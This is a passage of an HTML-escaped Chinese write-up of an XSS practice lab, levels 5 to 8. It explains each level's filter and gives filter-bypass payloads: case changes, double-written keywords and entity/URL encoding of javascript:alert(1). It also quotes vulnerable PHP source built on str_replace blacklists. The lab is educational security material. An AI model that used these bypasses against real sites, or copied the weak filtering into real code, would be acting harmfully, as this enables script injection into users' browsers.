&#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level5.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 6&lt;&#x2F;p&gt;
&lt;p&gt;本题用增加下划线的方式过滤href标签，可采用大小写绕过&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202153331833.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202153331833.png&quot; alt&#x3D;&quot;image-20240202153331833&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案&lt;code&gt;&quot;&gt;&lt;a HREF&#x3D;&quot;javascript:alert(1)&quot;&gt;1&lt;&#x2F;a&gt;&#x2F;&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;script&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;scr_ipt&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;on&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;o_n&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;src&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;sr_c&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;data&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;da_ta&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;href&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;hr_ef&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form action&#x3D;level6.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level6.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 7&lt;&#x2F;p&gt;
&lt;p&gt;本题以删除的方式过滤了href和script，可以使用双写绕过&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202154250121.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202154250121.png&quot; alt&#x3D;&quot;image-20240202154250121&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&quot;&gt;&lt;a HRHREFEF&#x3D;&quot;javascrscriptipt:alert(1)&quot;&gt;1&lt;&#x2F;a&gt;&#x2F;&#x2F;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strtolower&lt;&#x2F;span&gt;( &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;]);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;script&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;on&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;src&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;data&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;href&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form action&#x3D;level7.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level7.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 8&lt;&#x2F;p&gt;
&lt;p&gt;本题以添加下划线和html实体编码的形式绕过了href 、&lt;&gt; 、script 、&quot;等字符，我们可以采用HTML实体编码+URL编码的形式在URL中直接写入，也可以在input标签内输入HTML实体编码。input标签也会默认对Unicode进行解码，所以本题可使用编码方式绕过。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202154853561.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202154853561.png&quot; alt&#x3D;&quot;image-20240202154853561&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;相关网站：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;config.net.cn&#x2F;tools&#x2F;HtmlEncode.html&quot;&gt;在线Html实体编码解码&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.esjson.com&#x2F;urlEncode.html&quot;&gt;在线url网址编码解码&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.esjson.com&#x2F;unicodeEncode.html&quot;&gt;在线Unicode编码转换工具)&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;javaScript:alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;即：javascript:alert(1) #HTML实体编码-&gt;URL编码&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strtolower&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;]);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;script&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;scr_ipt&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span 